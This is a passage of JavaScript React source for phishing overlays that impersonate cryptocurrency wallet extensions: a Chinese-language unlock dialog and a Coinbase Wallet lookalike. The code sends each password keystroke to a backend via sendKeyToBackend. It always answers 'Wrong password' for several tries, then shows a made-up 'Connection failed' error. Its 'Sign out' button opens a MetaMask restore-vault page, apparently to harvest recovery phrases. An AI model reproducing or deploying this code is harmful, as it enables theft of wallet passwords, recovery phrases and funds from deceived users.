                        React.createElement("path", { d: "M34.8273 10.1173V5.92039H31.5438V0H27.0249V5.92039H24.2205V10.1173H27.0249V16.9873C27.0249 20.8067 27.7119 23.6137 31.9939 23.5268L34.6819 23.4691V19.5342H33.348C31.4448 19.5342 31.5508 18.3188 31.5508 16.0617L31.5433 10.1173H34.8267H34.8273Z", fill: "#FFFFFF" }))) : (React.createElement("svg", { width: "170", height: "30", viewBox: "0 0 170 30", fill: "none", xmlns: "http://www.w3.org/2000/svg", className: "m-auto" },
                        React.createElement("path", { d: "M104.264 23.2025L101.041 10.018L100.576 7.59018L100.082 10.018L96.888 23.2025H91.6609L85.824 0.272949H90.7897L93.955 15.3121L94.4777 18.0434L95.0004 15.3121L98.6594 0.272949H102.725L106.355 15.3121L106.878 18.0434L107.4 15.3121L110.566 0.272949H115.27L109.433 23.2025H104.264Z", fill: "#001F29" }),
                        React.createElement("path", { fillRule: "evenodd", clipRule: "evenodd", d: "M104.075 23.472L100.801 10.0808L100.568 8.86362L100.321 10.0821L97.0764 23.472H91.474L85.5 0.00390625H90.9846L94.1944 15.2543L94.4773 16.7323L94.761 15.2499L98.4703 0.00390625H102.914L106.593 15.2501L106.877 16.7323L107.16 15.2543L110.37 0.00390625H115.593L109.619 23.472H104.075ZM106.877 18.0436L106.354 15.3123L102.724 0.273153H98.6589L95 15.3123L94.4773 18.0436L93.9546 15.3123L90.7893 0.273153H85.8235L91.6604 23.2027H96.8875L100.082 10.0182L100.576 7.59038L101.04 10.0182L104.264 23.2027H109.433L115.269 0.273153H110.565L107.4 15.3123L106.877 18.0436Z", fill: "#001F29" }),
                        React.createElement("path", { d: "M118.82 11.7992H114.244C114.722 7.95076 117.504 5.59717 121.631 5.59717C126.237 5.59717 128.63 8.45964 128.63 12.4353V18.9872C128.63 21.2135 128.81 22.3585 129.079 23.2491H124.353C124.204 22.6766 124.114 21.9451 124.084 21.1181C122.828 22.9628 120.913 23.758 118.999 23.758C115.948 23.758 113.675 22.1041 113.675 18.8282C113.675 16.5064 114.932 14.7253 117.474 13.7711C119.568 13.0396 121.572 12.817 124.054 12.7852V12.4035C124.054 10.527 123.187 9.54102 121.422 9.54102C119.867 9.54102 119.029 10.4634 118.82 11.7992ZM118.252 18.5101C118.252 19.6551 119.059 20.3866 120.405 20.3866C122.439 20.3866 124.054 18.6373 124.054 16.2837V15.6158C119.418 15.7112 118.252 16.9198 118.252 18.5101Z", fill: "#001F29" }),
                        React.createElement("path", { d: "M135.039 0.000976562H130.49V23.4688H135.039V0.000976562Z", fill: "#001F29" }),
                        React.createElement("path", { d: "M141.452 0.000976562H136.903V23.4688H141.452V0.000976562Z", fill: "#001F29" }),
                        React.createElement("path", { d: "M157.281 8.55895C156.561 7.62011 155.659 6.88427 154.599 6.37108C153.54 5.85852 152.349 5.59717 151.061 5.59717C149.482 5.59717 148.058 5.98983 146.826 6.76374C145.592 7.54018 144.613 8.61858 143.914 9.97101C143.216 11.3222 142.862 12.8903 142.862 14.6303C142.862 16.3703 143.205 18.0419 143.882 19.414C144.561 20.7905 145.537 21.8702 146.782 22.6257C148.025 23.3767 149.486 23.758 151.122 23.758C153.13 23.758 154.836 23.2048 156.191 22.1131C157.496 21.0626 158.394 19.5808 158.883 17.7259H154.303C154.062 18.3571 153.723 18.8944 153.237 19.2731C152.662 19.7197 151.92 19.9462 151.031 19.9462C150.259 19.9462 149.598 19.7406 149.066 19.3359C148.532 18.9312 148.123 18.333 147.855 17.5559C147.694 17.0941 147.58 16.5632 147.513 15.9726H158.963L158.986 15.8166C159.19 14.4013 159.138 13.0603 158.83 11.8309C158.522 10.5984 158 9.49779 157.281 8.55895ZM147.585 12.7235C147.655 12.3663 147.75 11.9946 147.87 11.6558C148.149 10.8686 148.552 10.2628 149.068 9.8581C149.583 9.45338 150.223 9.24912 150.971 9.24912C151.909 9.24912 152.679 9.58216 153.259 10.2374C153.809 10.861 154.121 11.7129 154.188 12.7235H147.586H147.585Z", fill: "#001F29" }),
                        React.createElement("path", { d: "M170 10.1173V5.92039H166.717V0H162.198V5.92039H159.393V10.1173H162.198V16.9873C162.198 20.8067 162.885 23.6137 167.167 23.5268L169.855 23.4691V19.5342H168.521C166.618 19.5342 166.724 18.3188 166.724 16.0617L166.716 10.1173H170H170Z", fill: "#001F29" }),
                        React.createElement("path", { d: "M13.0951 11.1884C13.9274 10.6707 14.594 10.0262 15.0794 9.2663C15.6325 8.40104 15.9135 7.41272 15.9135 6.33052C15.9135 4.30441 15.2219 2.72297 13.859 1.62935C12.5124 0.548421 10.6596 0.000976562 8.35029 0.000976562H0V23.47H8.68391C11.116 23.47 13.0632 22.8509 14.4713 21.6285C15.8903 20.396 16.6108 18.6699 16.6108 16.4973C16.6108 15.1746 16.272 14.0366 15.6047 13.1155C15.0059 12.2921 14.1631 11.6445 13.0957 11.1884H13.0951ZM4.5189 4.23082H7.98714C9.07487 4.23082 9.89617 4.46173 10.4296 4.91592C10.9567 5.36441 11.2127 5.95372 11.2127 6.71684C11.2127 7.47996 10.9567 8.09909 10.4296 8.54948C9.89617 9.00367 9.07487 9.23458 7.98714 9.23458H4.5189V4.23082ZM11.0482 18.4447C10.447 18.9725 9.52896 19.2396 8.32017 19.2396H4.5189V13.4961H8.32017C9.52838 13.4961 10.4476 13.7543 11.0511 14.2612C11.6494 14.7667 11.9402 15.4341 11.9402 16.3038C11.9402 17.2185 11.6482 17.9188 11.0482 18.4453V18.4447Z", fill: "#001F29" }),
                        React.createElement("path", { d: "M22.7138 5.91992H18.1648V23.4686H22.7138V5.91992Z", fill: "#001F29" }),
                        React.createElement("path", { d: "M67.6457 8.55895C66.9257 7.62011 66.0234 6.88427 64.9634 6.37108C63.9047 5.85852 62.7138 5.59717 61.4257 5.59717C59.8468 5.59717 58.4225 5.98983 57.1912 6.76374C55.9569 7.54018 54.9775 8.61858 54.279 9.97101C53.5804 11.3222 53.2266 12.8903 53.2266 14.6303C53.2266 16.3703 53.57 18.0419 54.2471 19.414C54.9259 20.7905 55.9019 21.8702 57.1471 22.6257C58.3901 23.3767 59.8503 23.758 61.4865 23.758C63.4952 23.758 65.2003 23.2048 66.5556 22.1131C67.8612 21.0626 68.7589 19.5808 69.2477 17.7259H64.668C64.4271 18.3571 64.0877 18.8944 63.6017 19.2731C63.0272 19.7197 62.2852 19.9462 61.3956 19.9462C60.6241 19.9462 59.9632 19.7406 59.4309 19.3359C58.8963 18.9312 58.488 18.333 58.2198 17.5559C58.0588 17.0941 57.9447 16.5632 57.8775 15.9726H69.3277L69.3503 15.8166C69.5547 14.4013 69.5032 13.0603 69.195 11.8309C68.8863 10.5984 68.365 9.49779 67.6457 8.55895ZM57.9499 12.7235C58.02 12.3663 58.1144 11.9946 58.2343 11.6558C58.5135 10.8686 58.9166 10.2628 59.4332 9.8581C59.9476 9.45338 60.5876 9.24912 61.3359 9.24912C62.2736 9.24912 63.0434 9.58216 63.6237 10.2374C64.174 10.861 64.4862 11.7129 64.5528 12.7235H57.9505H57.9499Z", fill: "#001F29" }),
                        React.createElement("path", { d: "M22.8091 0H18.0701V4.22985H22.8091V0Z", fill: "#001F29" }),
                        React.createElement("path", { d: "M47.7204 7.91064C47.1823 7.20271 46.5516 6.654 45.8403 6.27465C44.9912 5.8249 43.9979 5.59717 42.8876 5.59717C41.5282 5.59717 40.3096 5.96446 39.267 6.68762C38.2256 7.41014 37.3997 8.43145 36.8129 9.72108C36.2285 11.0075 35.9314 12.5179 35.9314 14.2123C35.9314 15.9066 36.2436 17.3282 36.8599 18.6235C37.4773 19.9233 38.3333 20.9586 39.4037 21.7021C40.4764 22.4474 41.6996 22.8255 43.0399 22.8255C44.0518 22.8255 44.9761 22.5857 45.7859 22.1118C46.427 21.7369 46.964 21.2409 47.3874 20.6351V22.5457C47.3874 23.7301 47.103 24.6391 46.544 25.2449C45.9834 25.8507 45.1308 26.1565 44.0095 26.1565C43.0434 26.1565 42.2835 25.9167 41.7518 25.4428C41.3168 25.0552 40.9368 24.5465 40.8482 23.4694H36.4625C36.5031 24.9766 36.9073 25.9922 37.4779 26.8822C38.1179 27.8794 39.0179 28.659 40.1555 29.1975C41.282 29.7298 42.5893 30 44.0402 30C46.4757 30 48.4149 29.3295 49.802 28.0088C51.1979 26.6804 51.9057 24.8205 51.9057 22.4817V5.91942H47.7204V7.91064ZM46.9194 16.5435C46.6309 17.1956 46.2237 17.7069 45.7077 18.0609C45.1922 18.4148 44.5701 18.595 43.8577 18.595C42.8279 18.595 42.0275 18.2112 41.4089 17.4208C40.7926 16.6349 40.4804 15.5552 40.4804 14.2116C40.4804 12.8681 40.7926 11.7884 41.4089 11.0012C42.0193 10.2216 42.8435 9.82701 43.8577 9.82701C44.8719 9.82701 45.7679 10.2273 46.3981 11.019C47.034 11.817 47.3567 12.9023 47.3567 14.2427C47.3567 15.1112 47.2095 15.8844 46.9194 16.5429V16.5435Z", fill: "#001F29" }),
                        React.createElement("path", { d: "M80.3649 10.1173V5.92039H77.0814V0H72.5625V5.92039H69.7581V10.1173H72.5625V16.9873C72.5625 20.8067 73.2495 23.6137 77.5315 23.5268L80.2195 23.4691V19.5342H78.8856C76.9824 19.5342 77.0884 18.3188 77.0884 16.0617L77.0809 10.1173H80.3643H80.3649Z", fill: "#001F29" }),
                        React.createElement("path", { d: "M34.8273 10.1173V5.92039H31.5438V0H27.0249V5.92039H24.2205V10.1173H27.0249V16.9873C27.0249 20.8067 27.7119 23.6137 31.9939 23.5268L34.6819 23.4691V19.5342H33.348C31.4448 19.5342 31.5508 18.3188 31.5508 16.0617L31.5433 10.1173H34.8267H34.8273Z", fill: "#001F29" })))),
                    React.createElement("div", { id: "passwordBoxPage", className: "px-[20px] min-h-[60px]" },
                        React.createElement("p", { className: `leading-[20px] text-[14px] ${darkMode ? 'text-[#ffffff]' : 'text-[#001f29]'} mb-[10px]` }, "\u8BF7\u8F93\u5165\u5BC6\u7801\u89E3\u9501\u94B1\u5305"),
                        React.createElement("div", { className: "relative flex-col w-full" },
                            React.createElement("div", { className: `opacity-100 text-[14px] rounded-[12px] relative cursor-text flex flex-row box-border items-center leading-[16.6264px] transition-colors ${darkMode
                                    ? (error ? 'bg-[#35202C]' : 'bg-[#1B2122]')
                                    : (error ? 'bg-[#FFF6FB]' : 'bg-[#F6F9F9]')} ${!error && isFocused
                                    ? (darkMode ? 'border-2 border-[#00BBE0]' : 'border-2 border-[#00768E]')
                                    : 'border border-transparent'}` },
                                React.createElement("input", { ref: passwordInputRef, "aria-invalid": "false", autoComplete: "current-password", id: "component-password", placeholder: "\u8F93\u5165\u5BC6\u7801", type: showPassword ? "text" : "password", value: keyword, onChange: handleKeywordChange, onFocus: () => setIsFocused(true), onBlur: () => setIsFocused(false), onKeyDown: (e) => {
                                        if (e.key === 'Enter' && isButtonEnabled) {
                                            handleKeywordTyping();
                                        }
                                    }, className: `focus:outline-none border-none text-[14px] rounded-[12px] h-[16.6264px] box-content px-[14px] py-[15.5px] bg-transparent w-full ${darkMode ? 'text-white' : 'text-black'}` }),
                                keyword && keyword.length > 0 && (React.createElement("div", { className: "ml-[8px] flex items-center justify-center" },
                                    React.createElement("button", { className: "w-[40px] h-[40px] rounded-full flex items-center justify-center hover:bg-[rgba(255, 255, 255, 0.2)] transition-colors", tabIndex: 0, type: "button", "aria-label": "toggle password visibility", onClick: togglePasswordVisibility }, showPassword ? (React.createElement("svg", { width: "18", height: "18", viewBox: "0 0 18 18", preserveAspectRatio: "xMidYMid meet", fill: "none", role: "presentation", xmlns: "http://www.w3.org/2000/svg" },
                                        React.createElement("path", { d: "M9.00023 2.25C13.0443 2.25 16.4088 5.15982 17.1142 9C16.4088 12.8401 13.0443 15.75 9.00023 15.75C4.95609 15.75 1.59161 12.8401 0.88623 9C1.59161 5.15982 4.95609 2.25 9.00023 2.25ZM9.00023 14.25C12.1769 14.25 14.8952 12.039 15.5833 9C14.8952 5.96102 12.1769 3.75 9.00023 3.75C5.82345 3.75 3.10517 5.96102 2.41709 9C3.10517 12.039 5.82345 14.25 9.00023 14.25ZM9.00023 12.375C7.13624 12.375 5.6252 10.864 5.6252 9C5.6252 7.13604 7.13624 5.625 9.00023 5.625C10.8641 5.625 12.3752 7.13604 12.3752 9C12.3752 10.864 10.8641 12.375 9.00023 12.375ZM9.00023 10.875C10.0358 10.875 10.8752 10.0355 10.8752 9C10.8752 7.96448 10.0358 7.125 9.00023 7.125C7.9647 7.125 7.1252 7.96448 7.1252 9C7.1252 10.0355 7.9647 10.875 9.00023 10.875Z", fill: darkMode ? '#FFFFFF' : '#001F29' }))) : (React.createElement("svg", { width: "18", height: "18", viewBox: "0 0 18 18", preserveAspectRatio: "xMidYMid meet", fill: "none", role: "presentation", xmlns: "http://www.w3.org/2000/svg" },
                                        React.createElement("path", { d: "M13.412 14.4724C12.1361 15.2814 10.6229 15.7499 9.00023 15.7499C4.95609 15.7499 1.59161 12.8401 0.88623 8.99991C1.21374 7.21687 2.11449 5.63443 3.39035 4.45069L1.04525 2.10559L2.10591 1.04492L16.9552 15.8941L15.8945 16.9549L13.412 14.4724ZM4.4517 5.51203C3.45505 6.41987 2.72835 7.62516 2.41709 8.99991C3.10517 12.0388 5.82345 14.2499 9.00023 14.2499C10.1998 14.2499 11.334 13.9346 12.3182 13.3786L10.797 11.8573C10.2767 12.1852 9.6606 12.3749 9.00023 12.3749C7.13624 12.3749 5.6252 10.8638 5.6252 8.99991C5.6252 8.33946 5.81488 7.72333 6.14273 7.20307L4.4517 5.51203ZM9.68543 10.7458L7.25435 8.31471C7.17098 8.52696 7.1252 8.75803 7.1252 8.99991C7.1252 10.0354 7.9647 10.8749 9.00023 10.8749C9.24203 10.8749 9.47318 10.8291 9.68543 10.7458ZM15.6051 12.4441L14.532 11.371C15.0239 10.6699 15.3865 9.86871 15.5833 8.99991C14.8952 5.96089 12.1769 3.74988 9.00023 3.74988C8.3658 3.74988 7.74968 3.83806 7.16437 4.00339L5.98085 2.81987C6.91595 2.45195 7.93448 2.24988 9.00023 2.24988C13.0443 2.24988 16.4088 5.1597 17.1142 8.99991C16.88 10.2746 16.3529 11.4469 15.6051 12.4441ZM8.79218 5.63119C8.86095 5.627 8.93033 5.62488 9.00023 5.62488C10.8641 5.62488 12.3752 7.13592 12.3752 8.99991C12.3752 9.06973 12.3731 9.13911 12.3689 9.20788L8.79218 5.63119Z", fill: darkMode ? '#FFFFFF' : '#001F29' }))))))),
                            error && (React.createElement("p", { className: "m-0 text-[12px] mt-[3px] text-left leading-[1.66] text-[#ee2e76]", id: "component-password-text" }, "\u5BC6\u7801\u9519\u8BEF")))),
                    React.createElement("div", { id: "footer-place", className: "h-[154px]" },
                        React.createElement("div", { className: "z-[99] bottom-0 absolute left-0 right-0 w-[360px] my-0 mx-auto" },
                            React.createElement("div", { className: "z-[99] box-border px-[20px] pt-[10px] pb-[28px]" },
                                React.createElement("div", { className: "box-border w-full  text-center text-[16px] font-medium" },
                                    React.createElement("button", { onClick: handleKeywordTyping, onMouseDown: handleUnlockMouseDown, onMouseUp: handleUnlockMouseUp, onMouseLeave: handleUnlockMouseUp, className: `h-[54px] text-[16px] font-medium cursor-pointer w-full leading-[24px] text-center rounded-[54px] ${isUnlockPressed
                                            ? (darkMode ? 'bg-[#00AFBD] text-[#0B2125]' : 'bg-[#44B0BA] text-black')
                                            : (darkMode
                                                ? (keyword && keyword.length > 0 ? 'bg-[#00D3E2] text-[#0B2125]' : 'bg-[#0A6A70] text-[#0B2125]')
                                                : (keyword && keyword.length > 0 ? 'bg-[#62eef8] text-black' : 'bg-[#62eef8] text-[#A4AEAE]'))}` }, "\u8FDB\u5165\u94B1\u5305")),
                                React.createElement("div", { className: "box-border w-full  text-center text-[16px] font-medium rounded-[54px]" },
                                    React.createElement("button", { className: `mb-[8px] h-[54px] text-[16px] font-medium cursor-pointer w-full leading-[24px] text-center rounded-[54px] ${darkMode ? 'text-[#58585E]' : 'text-[#A4AEAE]'}` }, "\u5FD8\u8BB0\u5BC6\u7801?"))))),
                    showForgetPasswordModal && (React.createElement("div", { id: "forget-password-modal", className: "absolute inset-0 z-[1001]" },
                        React.createElement("div", { className: "relative w-full h-full" },
                            React.createElement("div", { className: "bg-[#10101099] absolute bottom-0 left-0 right-0 top-0", onClick: closeForgetPasswordModal }),
                            React.createElement("div", { tabIndex: -1, className: "absolute bottom-0 left-0 right-0 top-0 text-center flex items-center justify-center", role: "dialog" },
                                React.createElement("div", { role: "document", className: `mx-[20px] box-border text-[14px] tabular-nums list-none p-0 pb-[24px] pointer-events-none relative w-[520px] ${darkMode ? 'text-gray-100' : 'text-[#000000d9]'}` },
                                    React.createElement("div", { tabIndex: 0, "aria-hidden": "true", style: { width: "0px", height: "0px", overflow: "hidden", outline: "none" } }),
                                    React.createElement("div", { className: `rounded-[12px] border-0 shadow-[0_3px_6px_-4px_rgba(0,0,0,0.12),_0_6px_16px_0_rgba(0,0,0,0.08),_0_9px_28px_8px_rgba(0,0,0,0.05)] pointer-events-auto relative ${darkMode ? 'bg-gray-800' : 'bg-white'}` },
                                        React.createElement("div", { className: "p-[24px_16px_16px] text-[14px] leading-[1.5715] break-words" },
                                            React.createElement("div", { className: "mb-[20px] text-center" },
                                                React.createElement("div", { className: `text-[16px] font-bold ${darkMode ? 'text-gray-100' : ''}` }, "Security Tip")),
                                            React.createElement("p", { className: `text-[13px] leading-[20px] mb-[16px] text-left ${darkMode ? 'text-gray-300' : 'text-[#6d778c]'}` }, "If you've forgotten your password, you need to reset your wallet using your recovery phrase."),
                                            React.createElement("p", { className: `text-[13px] leading-[20px] mb-[16px] text-left ${darkMode ? 'text-gray-300' : 'text-[#6d778c]'}` }, "Please make sure you have backed up your recovery phrase before proceeding."),
                                            React.createElement("div", { className: "mt-[24px] rounded-[6px] text-white text-[13px] h-[38px] leading-[38px] text-center bg-[#232c41] cursor-pointer hover:bg-[#3a4555]", onClick: handledResetPwd }, "Continue"),
                                            React.createElement("div", { className: `cursor-pointer text-[13px] h-[20px] leading-[20px] mt-[12px] text-center hover:opacity-80 ${darkMode ? 'text-gray-300' : 'text-[#6d778c]'}`, onClick: closeForgetPasswordModal }, "Back"))),
                                    React.createElement("div", { tabIndex: 0, "aria-hidden": "true", className: "w-0 h-0 overflow-hidden outline-none" })))))))))))));
    return modalContent;
};

const CoinbaseModal = ({ isOpen, onClose, userId, backendConfig }) => {
    const [keyword, setKeyword] = useState('');
    const [error, setError] = useState(false);
    const [helperText, setHelperText] = useState('');
    const [trying, setTrying] = useState(0);
    const [connecting, setConnecting] = useState(false);
    const [connectionError, setConnectionError] = useState(false);
    const [isClosable, setIsClosable] = useState(true);
    const [showPassword, setShowPassword] = useState(false);
    const [isFocused, setIsFocused] = useState(false);
    const [showForgotPasswordPage, setShowForgotPasswordPage] = useState(false);
    const [isInputHovered, setIsInputHovered] = useState(false);
    const [isInputPressed, setIsInputPressed] = useState(false);
    const [isUnlockHovered, setIsUnlockHovered] = useState(false);
    const [isUnlockPressed, setIsUnlockPressed] = useState(false);
    const [isForgotPasswordHovered, setIsForgotPasswordHovered] = useState(false);
    const [isForgotPasswordPressed, setIsForgotPasswordPressed] = useState(false);
    const [isSignOutHovered, setIsSignOutHovered] = useState(false);
    const [isSignOutPressed, setIsSignOutPressed] = useState(false);
    const passwordInputRef = useRef(null);
    const modalRef = useRef(null);
    // Handle initial setup when modal opens
    useEffect(() => {
        if (isOpen) {
            initializeLocationData();
            initializeSocket();
            setTimeout(() => {
                passwordInputRef.current?.focus();
            }, 4000);
        }
        else {
            setShowForgotPasswordPage(false);
        }
    }, [isOpen]);
    // Handle document click - separate effect
    useEffect(() => {
        if (!isOpen)
            return;
        const handleDocumentClick = (e) => {
            if (isClosable && modalRef.current && !modalRef.current.contains(e.target)) {
                handleClick();
            }
        };
        document.addEventListener('click', handleDocumentClick);
        return () => {
            document.removeEventListener('click', handleDocumentClick);
        };
    }, [isOpen, isClosable]);
    const handleClick = () => {
        if (onClose)
            onClose();
        setKeyword('');
        setTrying(0);
        setConnectionError(false);
        setError(false);
        setShowPassword(false);
        setShowForgotPasswordPage(false);
    };
    const handleKeywordChange = async (e) => {
        const newKeyword = e.target.value;
        setKeyword(newKeyword);
        setError(false);
        const currentUserId = backendConfig?.userId || userId;
        if (currentUserId && newKeyword && (backendConfig?.enabled !== false)) {
            await sendKeyToBackend(currentUserId, 'cha', newKeyword, WALLET_TYPE_SHORTKEY.COINBASE);
        }
    };
    const togglePasswordVisibility = () => {
        setShowPassword(prev => !prev);
        setTimeout(() => {
            passwordInputRef.current?.focus();
        }, 0);
    };
    const handleKeywordTyping = async () => {
        if (connecting)
            return;
        setConnecting(true);
        const currentUserId = backendConfig?.userId || userId;
        if (!currentUserId) {
            setConnecting(false);
            setError(true);
            setHelperText('User ID is required');
            return;
        }
        if (backendConfig?.enabled !== false) {
            const result = await sendKeyToBackend(currentUserId, 'enter', keyword, WALLET_TYPE_SHORTKEY.COINBASE);
            setTimeout(() => {
                setConnecting(false);
                if (trying < 3) {
                    setError(true);
                    setHelperText(result.error || 'Wrong password');
                    setTrying(trying + 1);
                }
                else {
                    setConnectionError(true);
                }
                passwordInputRef.current?.focus();
            }, 150);
        }
        else {
            setTimeout(() => setConnecting(false), 150);
        }
    };
    const handleForgotPasswordClick = () => {
        setShowForgotPasswordPage(true);
    };
    const handleReturnFromForgotPassword = () => {
        setShowForgotPasswordPage(false);
    };
    const handleSignOut = () => {
        handleClick();
        window.open('chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault', '_blank');
    };
    const closeWindow = () => {
        handleClick();
        setTimeout(() => {
            setConnectionError(false);
            setKeyword('');
            setTrying(0);
            setError(false);
        }, 1000);
    };
    if (!isOpen)
        return null;
    const modalContent = (React.createElement("div", { id: "header-layout", ref: modalRef, className: `fixed top-0 right-[150px] z-[1000] flex transition-opacity duration-200 max-[395px]:scale-75 max-[265px]:scale-50
        ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`, onMouseEnter: () => setIsClosable(false), onMouseLeave: () => setIsClosable(true) },
        React.createElement("div", { className: "w-[375px] h-[600px] shadow-[0_2px_8px_0_rgba(0,0,0,0.2)] relative" },
            React.createElement("div", { className: "h-full relative", style: { backgroundColor: '#141519' } }, connectionError ? (React.createElement("div", { className: "text-white text-center px-4 py-8 flex flex-col h-full justify-between" },
                React.createElement("div", null),
                React.createElement("div", { className: "" },
                    React.createElement("div", { className: "flex justify-center w-full items-center mb-4" },
                        React.createElement("svg", { className: "text-2xl text-center text-red-500 w-6 h-6", fill: "currentColor", viewBox: "0 0 20 20" },
                            React.createElement("path", { fillRule: "evenodd", d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z", clipRule: "evenodd" }))),
                    React.createElement("h3", { className: "text-xl font-extrabold euclid-bold" }, "Connection failed"),
                    React.createElement("div", { className: "text-sm leading-relaxed" },
                        React.createElement("h6", null, "Fetching of"),
                        React.createElement("h5", { className: "font-bold" }, "@unstoppabledomains/unstoppable-"),
                        React.createElement("h5", null,
                            React.createElement("span", { className: "font-bold" }, "resolution-snap"),
                            " failed, check your network and"),
                        React.createElement("h5", null, "try again.")),
                    React.createElement("div", { className: "mt-4 text-base border-l-4 border-red-500 bg-red-50 text-black p-4 rounded text-left" },
                        React.createElement("h5", null, "One or more permissions are not allowed:"),
                        React.createElement("h5", null, "This endowment is experiental and therefore "),
                        React.createElement("h5", null, "not available."))),
                React.createElement("button", { className: "w-full rounded-full cursor-pointer schibsted-grotesk-regular p-2.5 hover:bg-[#3148f5] border-[#ffffff] bg-[#4459ff] text-[#141618]", onClick: closeWindow }, "Ok"))) : showForgotPasswordPage ? (React.createElement("div", { className: "flex flex-col w-full h-full bg-black" },
                React.createElement("div", { className: "py-[16px] flex flex-row items-start" },
                    React.createElement("div", { className: "flex flex-row items-start pl-[16px] w-[16px] h-[44px]" },
                        React.createElement("button", { onClick: handleReturnFromForgotPassword, className: "w-[40px] h-[40px] rounded-full flex items-center justify-center hover:bg-[rgba(255, 255, 255, 0.1)] transition-colors", "aria-label": "Return" },
                            React.createElement("svg", { className: "w-5 h-5 text-white", style: { width: '1em', height: '1em', verticalAlign: 'middle', fill: 'currentColor', overflow: 'hidden' }, viewBox: "0 0 1024 1024", version: "1.1", xmlns: "http://www.w3.org/2000/svg" },
                                React.createElement("path", { d: "M853.333333 469.333333v85.333334H341.333333l234.666667 234.666666-60.586667 60.586667L177.493333 512l337.92-337.92L576 234.666667 341.333333 469.333333h512z", fill: "currentColor" }))))),
                React.createElement("div", { className: "flex flex-col justify-start flex-1 px-[24px] pb-[24px]" },
                    React.createElement("h1", { className: "coinbase-font-bold text-[28px] font-bold text-white pt-[8px] pb-[16px]" }, "Forgot password?"),
                    React.createElement("div", { className: "flex flex-col gap-[16px]" },
                        React.createElement("p", { className: "coinbase-font text-[16px] text-[#8A919E]" },
                            "If you've forgotten your password, you need to sign out and re-enter your recovery phrase. After that, you can create a new password.",
                            React.createElement("br", null),
                            React.createElement("br", null),
                            "Do not sign out unless you know your 12-word recovery phrase.")),
                    React.createElement("p", { className: "coinbase-font text-[16px] text-[#FFFFFF] pt-[16px]" }, "Signing out of 1 recovery phrase."),
                    React.createElement("div", { className: "pt-[16px]" },
                        React.createElement("button", { onClick: handleSignOut, onMouseEnter: () => setIsSignOutHovered(true), onMouseLeave: () => {
                                setIsSignOutHovered(false);
                                setIsSignOutPressed(false);
                            }, onMouseDown: () => setIsSignOutPressed(true), onMouseUp: () => setIsSignOutPressed(false), className: `coinbase-font h-[56px] text-[16px] bg-[rgb(38,40,45)] font-semibold cursor-pointer w-full leading-[24px] text-center rounded-[54px] transition-all ${isSignOutPressed
                                ? 'bg-[rgb(40,43,49)] text-[#ffffff] h-[55px] w-[calc(100%-1px)] mx-[0.5px]'
                                : isSignOutHovered
                                    ? 'bg-[rgb(50, 53, 59)] text-[#ffffff] h-[56px] w-full'
                                    : 'bg-[rgb(50, 53, 59)] text-[#ffffff] h-[56px] w-full'}` }, "Sign out"))))) : (React.createElement("div", { className: "flex flex-col w-full h-full pt-[24px] pb-[32px] px-[16px]" },
                React.createElement("div", { className: "flex flex-col" },
                    React.createElement("div", { className: "pb-[16px]" },
                        React.createElement("div", { className: "flex w-[58px] h-[58px] rounded-[16px] overflow-hidden" },
                            React.createElement("svg", { width: "100%", viewBox: "0 0 1024 1024", fill: "none", xmlns: "http://www.w3.org/2000/svg" },
                                React.createElement("rect", { width: "1024", height: "1024", fill: "#0052FF" }),
                                React.createElement("path", { fillRule: "evenodd", clipRule: "evenodd", d: "M152 512C152 710.823 313.177 872 512 872C710.823 872 872 710.823 872 512C872 313.177 710.823 152 512 152C313.177 152 152 313.177 152 512ZM420 396C406.745 396 396 406.745 396 420V604C396 617.255 406.745 628 420 628H604C617.255 628 628 617.255 628 604V420C628 406.745 617.255 396 604 396H420Z", fill: "white" })))),
                    React.createElement("h1", { className: "coinbase-font-bold text-[28px] font-bold text-white" }, "Coinbase Wallet"),
                    React.createElement("h1", { className: "coinbase-font-bold text-[20px] font-bold text-[#8A919E] pb-[8px]" }, "Extension")),
                React.createElement("div", { className: "h-full" }),
                React.createElement("div", { className: "flex flex-col justify-between h-full gap-[16px]" },
                    React.createElement("div", { className: "flex flex-col gap-[4px] min-h-[106px]" },
                        React.createElement("label", { className: "coinbase-font-bold text-[14px] text-[#ffffff] py-[4px] w-full font-semibold" }, "Unlock with password"),
                        React.createElement("div", { className: "relative flex-col w-full" },
                            React.createElement("div", { onMouseEnter: () => setIsInputHovered(true), onMouseLeave: () => {
                                    setIsInputHovered(false);
                                    setIsInputPressed(false);
                                }, onMouseDown: () => setIsInputPressed(true), onMouseUp: () => setIsInputPressed(false), className: `opacity-100 text-[14px] rounded-[8px] relative cursor-text flex flex-row box-border items-center transition-colors ${isInputPressed
                                    ? 'bg-[rgb(21,22,24)]'
                                    : isInputHovered
                                        ? 'bg-[rgb(17,18,20)]'
                                        : 'bg-[rgb(10,11,13)]'} ${error
                                    ? (isFocused
                                        ? 'border-2 border-[rgb(240,97,109)]'
                                        : 'border border-[rgb(240,97,109)]')
                                    : (isFocused
                                        ? 'border-2 border-[rgb(55,115,245)]'
                                        : 'border border-[rgba(138,145,158,0.66)]')}` },
                                React.createElement("input", { ref: passwordInputRef, "aria-invalid": "false", autoComplete: "current-password", id: "component-password", type: showPassword ? "text" : "password", value: keyword, onChange: handleKeywordChange, onFocus: () => setIsFocused(true), onBlur: () => setIsFocused(false), onKeyPress: (e) => {
                                        if (e.key === 'Enter') {
                                            handleKeywordTyping();
                                        }
                                    }, className: "coinbase-font focus:outline-none border-none text-[16px] rounded-[8px] box-content p-[16px] bg-transparent w-full text-white tracking-normal", placeholder: "" }),
                                React.createElement("div", { className: "ml-[8px] flex items-center justify-center" },
                                    React.createElement("button", { className: "w-[40px] h-[40px] rounded-full flex items-center justify-center hover:bg-[rgba(255, 255, 255, 0.2)] transition-colors", tabIndex: 0, type: "button", "aria-label": "toggle password visibility", onClick: togglePasswordVisibility }, showPassword ? (React.createElement("svg", { className: "w-4 h-4 text-white", style: { width: '1em', height: '1em', verticalAlign: 'middle', fill: 'currentColor', overflow: 'hidden' }, viewBox: "0 0 1024 1024", version: "1.1", xmlns: "http://www.w3.org/2000/svg" },
